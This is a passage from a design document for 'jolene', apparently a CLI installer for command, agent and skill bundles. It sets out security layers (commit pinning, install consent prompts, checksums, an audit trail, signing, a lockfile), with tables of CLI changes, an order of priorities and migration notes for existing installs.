particular machine's install, not of the reproducible content set. A lockfile
install therefore never enables auto-accept or a signature requirement on the
target machine — the user sets those explicitly if wanted.

**Lockfile install and consent.** `jolene install --lockfile` presents a single
consent gate for the whole file: it prints the per-bundle review-status summary
(Layer 6) and prompts once with `[y/N]`. `--yes` skips the prompt (checksum
verification is always enforced), and a non-interactive run without `--yes`
errors, consistent with every other install.

---

## Summary of CLI Changes

### New flags on existing commands

| Command | Flag | Layer | Purpose |
|---------|------|-------|---------|
| `install` | `--ref <ref>` | 1 | Install a specific tag, branch, or commit |
| `install` | `--yes` | 2 | Skip confirmation prompt |
| `install` | `--auto-accept-updates` | 2 | Auto-accept this source's future updates (skip the review prompt) |
| `install` | `--lockfile <path>` | 6 | Install from lockfile |
| `install` | `--verify-signature` | 5 | Require signed commit |
| `update` | `--all` | 1 | Update every installed bundle (required to update all) |
| `update` | `--ref <ref>` | 1 | Update a ref-pinned bundle to a new ref |
| `update` | `--yes` | 1 | Skip confirmation prompt |
| `update` | `--fetch-only` | 1 | Fetch and show changes without applying |
| `update` | `--accept-rewrite` | 1 | Accept force-pushed history (named bundle only) |
| `update` | `--skip-verify` | 5 | Skip signature verification for one update |

### New commands

| Command | Layer | Purpose |
|---------|-------|---------|
| `jolene outdated` | 1 | Check for upstream updates without applying |
| `jolene audit` | 4 | Query the audit trail |
| `jolene trust` | 5 | Manage signing key trust |
| `jolene lock` | 6 | Generate, mark-reviewed, or verify a lockfile |

### Modified commands

| Command | Layer | Change |
|---------|-------|--------|
| `install` | 2 | `[y/N]` confirmation gate with summary and review pointers |
| `update` | 1 | Two-phase fetch/apply with change summary and `[y/N]` confirmation |
| `doctor` | 3 | Integrity checksum verification; `--backfill` to compute missing checksums |

---

## Prioritisation

Layers are ordered by impact-to-effort ratio. Each layer is independently
valuable — they can be implemented and shipped incrementally.

| Priority | Layer | Effort | Impact | Rationale |
|----------|-------|--------|--------|-----------|
| **P0** | 2 — Pre-install consent | Low | High | Low-hanging fruit. Show what's being installed, ask for confirmation. Prevents accidental installs. |
| **P0** | 1 — Commit pinning | Medium | Critical | Foundation for update security. Without pinning, updates are uncontrolled trust decisions. |
| **P1** | 4 — Audit trail | Low | High | Cheap to implement (append-only JSONL). Enables post-incident investigation. |
| **P1** | 3 — Integrity checksums | Medium | High | Detects tampering and force-push content replacement. Extends `doctor` naturally. |
| **P2** | 6 — Lockfile | Medium | Medium | Enables team use cases and reproducible installs. Ties together pinning + checksums. |
| **P3** | 5 — Provenance (signing) | High | Medium | Strong trust chain but depends on ecosystem adoption of commit signing. |

### Suggested implementation order

1. **P0: Layer 2 (consent) + Layer 1 (pinning)** — these form the minimum
   viable security story. Layer 2 is simple and can ship first; Layer 1
   requires more git plumbing but is the foundation for everything else.

2. **P1: Layer 4 (audit) + Layer 3 (checksums)** — audit is trivial to add
   once the other layers exist. Checksums extend the state model and doctor
   command.

3. **P2: Layer 6 (lockfile)** — builds on pinning and checksums; enables
   reproducible, team-shareable installs.

4. **P3: Layer 5 (provenance)** — depends on the git signing ecosystem.
   Implement when demand justifies the complexity.

---

## Migration: Existing Installs

Bundles installed before these security layers exist have no checksums, no
audit trail, and no consent record. Each layer must handle pre-existing state
gracefully.

### Layer 1: Commit Pinning

No migration needed. The `commit` field already exists in state. The new
`ref_pinned` field is `Option<None>` for existing bundles, which correctly
means "not ref-pinned — follows the default branch." Existing bundles
continue to update normally via the new two-phase flow.

### Layer 2: Pre-Install Consent

No migration needed. Consent applies at install time only. Existing bundles
were installed under the old rules; they are not retroactively prompted.
Updates to existing bundles go through the Layer 1 update consent flow, which
is sufficient. Existing bundles also have `auto_accept_updates: None`, so their
updates prompt normally until the bundle is reinstalled with
`--auto-accept-updates`.

### Layer 3: Integrity Checksums

Existing `SymlinkEntry` values will have `sha256: None` and `checksums: None`.
On `jolene doctor`, entries with missing checksums are reported as a distinct
status — not a failure, not a silent skip:

```
  junebug/review-tools
    [NO CHECKSUM] commands/review.md (installed before integrity tracking)
    [NO CHECKSUM] skills/code-analysis/
```

`jolene update` backfills checksums: when an existing bundle is updated, the
new `SymlinkEntry` values include checksums computed from the updated content.
After one update cycle, all actively maintained bundles have checksums.

For bundles that never update, users can run `jolene doctor --backfill` (a new
flag) to compute and record checksums for all entries that lack them. This is
a one-time migration convenience, not a recurring operation.

### Layer 4: Audit Trail

No migration needed. The audit log starts empty. There are no retroactive
entries for pre-existing installs. The first recorded event for each bundle
will be its next update or uninstall.

### Layer 5: Provenance (Commit Signing)

No migration needed. Signature verification is opt-in via `--verify-signature`
at install time. Existing bundles have `verify_signature: None` and are not
subject to signature checks.

### Layer 6: Lockfile

`jolene lock` handles pre-existing installs explicitly: if a bundle has no
checksums in state (installed before Layer 3), `jolene lock` computes them
on the fly from the current content on disk. The lockfile is always complete
regardless of when bundles were installed.

---

## What Stays Unchanged

- **Symlink strategy.** File-level for commands/agents, directory-level for
  skills. Absolute paths. Conflict detection logic.

- **Store layout.** `repos/{hash}/`, `rendered/{hash}/{target}/`. SHA256
  store keys.

- **Bundle format.** `jolene.toml` manifest, content directories, templating
  syntax.

- **Marketplace mode.** Filesystem scanning, plugin source resolution. No
  `jolene.toml` required in plugins.

- **Target adapters.** Auto-detection, supported content types per target.

- **Template rendering.** MiniJinja environment, custom delimiters, variable
  overrides.

- **Uninstall.** Symlink removal, optional purge, shared clone detection.

- **Concurrency.** Advisory file locking via `flock(2)` on `~/.jolene/.lock`.
